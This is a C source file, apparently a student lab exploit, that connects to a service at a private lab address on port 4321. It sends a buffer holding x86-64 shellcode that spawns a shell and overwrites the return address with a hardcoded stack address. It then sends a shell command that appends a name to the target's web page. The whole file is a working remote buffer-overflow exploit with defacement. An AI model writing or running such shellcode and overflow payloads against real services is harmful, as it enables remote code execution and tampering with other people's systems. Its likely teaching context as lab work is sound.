#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <errno.h>

#define BUFFER_SIZE 256
#define SHELL_CODE_SIZE 27
#define BUFFER_ADDR 0x7fffffffe5e0
#define RETURN_ADDR_DISTANCE 24

int main(int argc,char* argv[]){
	printf("telnet 192.168.56.103 4321\n");

    //ip address and port number
    char IP_ADDRESS[]="192.168.56.103";
    uint16_t PORT_NUMBER=4321;

	//create socket
	int socket_fd=socket(AF_INET, SOCK_STREAM, 0);
    if(socket_fd<0){
        fprintf(stderr, "Could not create socket: %s\n", strerror(errno));
        return -1;
    }

	//assign values
	struct sockaddr_in addr_server;
	addr_server.sin_family=AF_INET;
	addr_server.sin_port=htons(PORT_NUMBER);
	int ret=inet_pton(AF_INET,(const char *)IP_ADDRESS,(void *)&(addr_server.sin_addr));
	if(ret<0){
        fprintf(stderr, "Could not identify IP_ADDRESS: %s, %s\n", argv[0], strerror(errno));
        return -1;
    }

	//create sending send_buf
	u_int8_t send_buf[BUFFER_SIZE];
	//fill in the send_buf with 'A' (0x41)
	memset(send_buf,0x41,BUFFER_SIZE); 
	//write the code to trigger shell
	u_int8_t shell_code[]= {0x31,0xc0,0x48,0xbb,0xd1,0x9d,0x96,0x91,0xd0,0x8c,0x97,0xff,0x48,0xf7,0xdb,0x53,0x54,0x5f,0x99,0x52,0x57,0x54,0x5e,0xb0,0x3b,0x0f,0x05 };
	memcpy(send_buf, shell_code,SHELL_CODE_SIZE);
	//write the send_buf address
	u_int64_t buf_addr=BUFFER_ADDR;
	memcpy(send_buf+128-12+RETURN_ADDR_DISTANCE,&buf_addr,8);

	//connect
	printf("Trying 192.168.56.103...\n");
	ret=connect(socket_fd,(struct sockaddr*) &addr_server,sizeof(struct sockaddr_in));
	if(ret<0){
        fprintf(stderr, "Could not connect: %s, %s\n", argv[0], strerror(errno));
        return -1;
    }
	printf("Connected to 192.168.56.103.\nEscape character is '^]'.\n");

	//receive
	char recv_buf[BUFFER_SIZE];
	int recv_length=recv(socket_fd,recv_buf,BUFFER_SIZE,0);
	if(recv_length<0){
		fprintf(stderr, "Could not receive: %s, %s\n", argv[0], strerror(errno));
        return -1;
	}

	printf("%s\n",recv_buf);
	//send
	ret=send(socket_fd,(const void*)send_buf,BUFFER_SIZE,0);
	if(ret<0){
		fprintf(stderr, "Could not send: %s, %s\n", argv[0], strerror(errno));
        return -1;
	}
	
	//send the command to write my name
	char command[]="echo '<p>Chengqi Liu</p>' >> /var/www/html/index.html";
	//send
	ret=send(socket_fd,(const void*)command,strlen(command),0);
	if(ret<0){
		fprintf(stderr, "Could not send: %s, %s\n", argv[0], strerror(errno));
		return -1;
	}

	return 0;
};

